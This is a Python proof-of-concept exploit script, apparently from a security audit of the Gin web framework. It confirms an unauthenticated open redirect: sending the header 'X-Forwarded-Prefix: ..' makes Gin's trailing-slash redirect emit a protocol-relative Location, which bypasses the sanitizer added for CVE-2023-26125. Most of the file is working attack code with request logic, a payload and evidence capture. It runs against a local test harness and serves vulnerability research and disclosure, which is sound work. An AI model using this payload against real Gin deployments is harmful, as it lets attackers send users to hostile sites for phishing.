#!/usr/bin/env python3
"""
VULN-001 — X-Forwarded-Prefix empty-prefix => protocol-relative external open redirect
=======================================================================================

Vulnerable code (targets/gin):
    gin.go:810-824  redirectTrailingSlash  — folds X-Forwarded-Prefix into Location
    gin.go:826-835  sanitizePathChars      — the CVE-2023-26125 "fix" that fails open
    gin.go:849-861  redirectRequest        — emits req.URL.String() via http.Redirect

Class: CWE-601 (URL Redirection to Untrusted Site / Open Redirect).

The flaw
--------
On a trailing-slash miss gin issues a 301/308 whose Location is built from the
attacker-controlled `X-Forwarded-Prefix` request header:

    p = sanitizePathChars(prefix) + "/" + req.URL.Path

`sanitizePathChars` keeps only [A-Za-z0-9/-], so a prefix of ".." (or "%", "...")
is reduced to the EMPTY string. Since `req.URL.Path` always starts with "/",
the result is:

    "" + "/" + "/hello/john"  ==  "//hello/john"

`redirectRequest` hands that to `http.Redirect`, which `url.Parse`s "//hello/john"
as an authority URL (Host="hello") and therefore SKIPS its relative-path
cleaning — so the raw `Location: //hello/john` reaches the wire. A browser treats
a protocol-relative Location as `http(s)://hello/john`, i.e. an EXTERNAL origin.
This is a novel bypass of the sanitizer shipped for CVE-2023-26125.

Exploitation idea
------------------
Send a single unauthenticated GET to any trailing-slash-redirecting path with the
header `X-Forwarded-Prefix: ..`. The host of the resulting external redirect is the
first path segment; with a root-level `:param`/`*catchAll` route it is fully
attacker-chosen (proven separately against the extended harness on :36275).

A successful run proves: the server emits `Location: //<host>...` (protocol-relative,
off the app's origin) from nothing but one attacker header — an unauthenticated
open redirect that defeats the shipped CVE-2023-26125 guard.
"""
import os
import sys

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
from _common import banner, log, verdict, session, base_url, save  # noqa: E402

BASE = base_url(36274)                       # default harness, gin.Default() @ :36274
# A path that triggers gin's trailing-slash redirect: the route is /hello/:name,
# so requesting /hello/john/ (with trailing slash) has no exact match and gin
# offers a 301 back to /hello/john -- and that is where the Location is built.
TSR_PATH = os.environ.get("TSR_PATH", "/hello/john/")


def main() -> int:
    banner("VULN-001",
           "X-Forwarded-Prefix empty-prefix -> protocol-relative external open redirect",
           BASE, "gin.go:810-824 redirectTrailingSlash / sanitizePathChars / redirectRequest")
    s = session()

    # ---- STEP 1: baseline — the same request with NO attacker header stays same-origin.
    log("STEP", f"baseline: GET {TSR_PATH} with no X-Forwarded-Prefix (expect same-origin 301)")
    r0 = s.get(BASE + TSR_PATH, headers={})
    loc0 = r0.headers.get("Location", "")
    log("INFO", f"baseline -> HTTP {r0.status_code}, Location: {loc0!r}")

    # ---- STEP 2: the attack. X-Forwarded-Prefix: ".." sanitizes to "" inside gin,
    # so the Location becomes "" + "/" + "/hello/john" = "//hello/john".
    # `..` is the decisive payload: path.Clean("..")==".." (!= ".") so the header is
    # accepted, but sanitizePathChars strips both dots => empty prefix => leading "//".
    log("STEP", "attack: resend with header  X-Forwarded-Prefix: ..  (sanitizes to empty -> '//')")
    hdrs = {"X-Forwarded-Prefix": ".."}
    r = s.get(BASE + TSR_PATH, headers=hdrs)
    loc = r.headers.get("Location", "")
    log("INFO", f"attack   -> HTTP {r.status_code}, Location: {loc!r}")

    # ---- STEP 3: also show controlled-prefix injection (non-empty prefix) for contrast.
    log("STEP", "control: header  X-Forwarded-Prefix: /evil  (prefix injected into Location)")
    r2 = s.get(BASE + TSR_PATH, headers={"X-Forwarded-Prefix": "/evil"})
    loc2 = r2.headers.get("Location", "")
    log("INFO", f"prefix-injection -> HTTP {r2.status_code}, Location: {loc2!r}")

    # ---- Persist evidence.
    req_txt = (
        f"GET {TSR_PATH} HTTP/1.1\r\n"
        f"Host: {BASE.split('//',1)[1]}\r\n"
        f"X-Forwarded-Prefix: ..\r\n"
        f"User-Agent: gin-st10/1.0\r\n\r\n"
    )
    save(os.path.join(os.path.dirname(__file__), "request.http"), req_txt)
    resp_txt = (
        f"# baseline (no header):    HTTP {r0.status_code}  Location: {loc0}\n"
        f"# ATTACK (XFP: ..):        HTTP {r.status_code}  Location: {loc}\n"
        f"# prefix-inject (XFP:/evil):HTTP {r2.status_code}  Location: {loc2}\n\n"
        + "\r\n".join(f"{k}: {v}" for k, v in r.headers.items()) + "\r\n"
    )
    save(os.path.join(os.path.dirname(__file__), "response.txt"), resp_txt)

    # ---- ASSERT on the real security effect: a protocol-relative (external) Location.
    # `//...` is protocol-relative: RFC 3986 network-path reference. Browsers navigate
    # to http(s)://<first-segment>/... i.e. OFF this app's origin. That is the bug.
    is_external = loc.startswith("//") and not loc.startswith("///")
    if is_external and 300 <= r.status_code < 400:
        host = loc.lstrip("/").split("/", 1)[0]
        log("PROOF", f"server returned {r.status_code} with Location: {loc!r}")
        log("PROOF", f"'//' is a protocol-relative URL -> browser navigates to http(s)://{host}/... "
                     f"= EXTERNAL origin, from one unauthenticated header")
        # sanity: baseline must NOT have been external, proving the header caused it
        if not loc0.startswith("//"):
            log("OK", "exploit confirmed — X-Forwarded-Prefix:.. turned a same-origin 301 into a "
                      "protocol-relative external redirect (novel CVE-2023-26125-fix bypass)")
            return verdict("VULN-001", "CONFIRMED",
                           f"unauth open redirect: Location: {loc} (external origin http://{host})")
        log("FAIL", "baseline was already external — cannot attribute to the header")
        return verdict("VULN-001", "FAILED", "baseline redirect already external")
    log("FAIL", f"Location {loc!r} is not a protocol-relative external redirect")
    return verdict("VULN-001", "FAILED", "no protocol-relative Location produced")


if __name__ == "__main__":
    sys.exit(main())
